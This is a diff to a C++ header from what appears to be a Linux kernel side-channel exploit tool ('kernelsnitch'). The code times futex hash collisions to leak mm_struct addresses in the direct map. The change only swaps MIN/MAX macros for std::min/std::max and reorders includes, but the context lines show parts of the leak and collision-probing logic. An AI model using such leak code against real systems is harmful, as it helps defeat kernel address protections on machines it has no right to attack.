@@ -1,11 +1,12 @@
 #pragma once
 
-#include "timeutils.h"
 #include "utils.h"
+#include "timeutils.h"
 #include "futex_hash.h"
 #include "scan_bounds.h"
 #include "kernel/target.h"
 
+#include <algorithm>
 #include <linux/futex.h>
 #include <sys/syscall.h>
 #include <sys/time.h>
@@ -282,7 +283,8 @@ namespace ghostlock::kernelsnitch {
     static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
-        const size_t ceiling = MIN(ghostlock::kernel::g_direct_map_end, IDENTITY_END);
+        const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                                                  static_cast<uint64_t>(IDENTITY_END));
         for (size_t i = 0; i < ks->thread_cnt; ++i) {
             struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
                 calloc(1, sizeof(struct mm_leak_arg))));
@@ -358,7 +360,9 @@ namespace ghostlock::kernelsnitch {
         /* mm_structs live in the direct map, so the scan stops at its end and never
      * past the identity range the futexes are drawn from */
         ks->identity_diff =
-                ((MIN(ghostlock::kernel::g_direct_map_end, IDENTITY_END) - IDENTITY_START) / ks->thread_cnt);
+                ((std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                                     static_cast<uint64_t>(IDENTITY_END)) -
+                  static_cast<uint64_t>(IDENTITY_START)) / ks->thread_cnt);
 
         ks->futex_addrs = static_cast<volatile size_t *>(SYSCHK(mmap(0, sizeof(size_t) * (ks->collisions + 1),
                                                                      PROT_WRITE | PROT_READ,
@@ -491,10 +495,10 @@ namespace ghostlock::kernelsnitch {
                                    size_t verify_repeat, size_t verify_avg) {
 #define ID 128
         size_t wanted = ks->collisions - 1;
-        size_t scan_approx_time = MIN(__measure((size_t) &ks->futexes[0], scan_repeat, scan_avg),
-                                      __measure((size_t) &ks->futexes[4096 + 8], scan_repeat, scan_avg));
-        size_t verify_approx_time = MIN(__measure((size_t) &ks->futexes[0], verify_repeat, verify_avg),
-                                        __measure((size_t) &ks->futexes[4096 + 8], verify_repeat, verify_avg));
+        size_t scan_approx_time = std::min(__measure((size_t) &ks->futexes[0], scan_repeat, scan_avg),
+                                           __measure((size_t) &ks->futexes[4096 + 8], scan_repeat, scan_avg));
+        size_t verify_approx_time = std::min(__measure((size_t) &ks->futexes[0], verify_repeat, verify_avg),
+                                             __measure((size_t) &ks->futexes[4096 + 8], verify_repeat, verify_avg));
 
         /* piled-up hash bucket ID 128 */
         __increase(ks, ID, APPENDED_FUTEXES);
@@ -508,9 +512,9 @@ namespace ghostlock::kernelsnitch {
         auto *best = static_cast<coll_cand_t *>(
             calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t)));
         ASSERT_pr(best, "calloc best\n");
-        size_t cheap_probe_extra = MAX((wanted + 2) / 3, (size_t) KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
+        size_t cheap_probe_extra = std::max((wanted + 2) / 3, (size_t) KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
         size_t cheap_probe_after = ks->futex_hash_table_size * (wanted + cheap_probe_extra);
-        size_t full_probe_extra = MAX((wanted + 1) / 2, (size_t) KERNELSNITCH_EARLY_PROBE_MIN_EXTRA);
+        size_t full_probe_extra = std::max((wanted + 1) / 2, (size_t) KERNELSNITCH_EARLY_PROBE_MIN_EXTRA);
         size_t full_probe_after = ks->futex_hash_table_size * (wanted + full_probe_extra);
         int32_t cheap_probed = (cheap_probe_after >= full_probe_after ||
                             cheap_probe_after >= ks->total_futexes ||
